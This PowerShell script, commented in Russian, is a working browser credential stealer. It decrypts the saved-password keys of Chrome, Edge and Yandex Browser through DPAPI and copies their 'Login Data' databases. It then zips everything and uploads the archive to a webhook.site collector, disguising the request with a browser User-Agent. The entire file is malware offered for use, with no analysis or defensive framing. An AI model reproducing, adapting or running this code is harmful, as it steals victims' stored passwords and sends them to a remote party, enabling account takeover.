[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Твой URL с Webhook.site
$url = "https://webhook.site/94f7a3be-c2d7-4eaa-872b-7a1e5897bf12"

$tmp = "$env:TEMP\$( -join ((97..122) | Get-Random -Count 6 | % {[char]$_}) )"
New-Item -ItemType Directory -Path $tmp -Force > $null
$log = "$tmp\sys.log"

Add-Type -AssemblyName System.Security

function Get-Key($p, $l) {
    if (Test-Path $p) {
        try {
            $j = Get-Content $p -Raw | ConvertFrom-Json
            $e = [Convert]::FromBase64String($j.os_crypt.encrypted_key)
            $m = [System.Security.Cryptography.ProtectedData]::Unprotect($e[5..($e.Length-1)], $null, 0)
            "[$l] Key: $([Convert]::ToBase64String($m))" | Out-File -FilePath $log -Append
            return $true
        } catch { return $false }
    }
    return $false
}

$paths = @(
    @{n="CH"; p="Google\Chrome\User Data"},
    @{n="ED"; p="Microsoft\Edge\User Data"},
    @{n="YX"; p="Yandex\YandexBrowser\User Data"}
)

foreach ($b in $paths) {
    $target = Join-Path $env:LOCALAPPDATA $b.p
    if (Test-Path $target) {
        $files = Get-ChildItem -Path $target -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue
        foreach ($f in $files) {
            $label = "$($b.n)_$($f.Directory.Name)"
            if (Get-Key (Join-Path $target "Local State") $label) {
                Copy-Item $f.FullName -Destination "$tmp\$label.dat" -Force -ErrorAction SilentlyContinue
            }
        }
    }
}

$count = (Get-ChildItem $tmp).Count
Write-Host "Файлов собрано: $count"

if ($count -gt 0) {
    $z = "$env:TEMP\$( -join ((97..122) | Get-Random -Count 4 | % {[char]$_}) ).zip"
    Compress-Archive -Path "$tmp\*" -DestinationPath $z -Force
    Write-Host "Архив создан: $z"

    try {
        # Используем встроенный Invoke-RestMethod, но маскируем User-Agent
        # Это надежнее HttpClient для быстрой отправки на Webhook.site
        $fileBytes = [System.IO.File]::ReadAllBytes($z)
        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        
        $body = "--$boundary$LF"
        $body += "Content-Disposition: form-data; name=`"file`"; filename=`"data.zip`"$LF"
        $body += "Content-Type: application/octet-stream$LF$LF"
        
        $postData = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetBytes($body)
        $postData += $fileBytes
        $postData += [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetBytes("$LF--$boundary--$LF")

        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $postData -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        Write-Host "Отправка завершена успешно!"
    } catch {
        Write-Host "Ошибка отправки: $($_.Exception.Message)"
    }

    if (Test-Path $z) { Remove-Item $z -Force }
} else {
    Write-Host "Данные не найдены. Отправка отменена."
}

# Оставляем временную папку для проверки, если ничего не пришло
# Remove-Item -Recurse -Force $tmp -ErrorAction SilentlyContinue
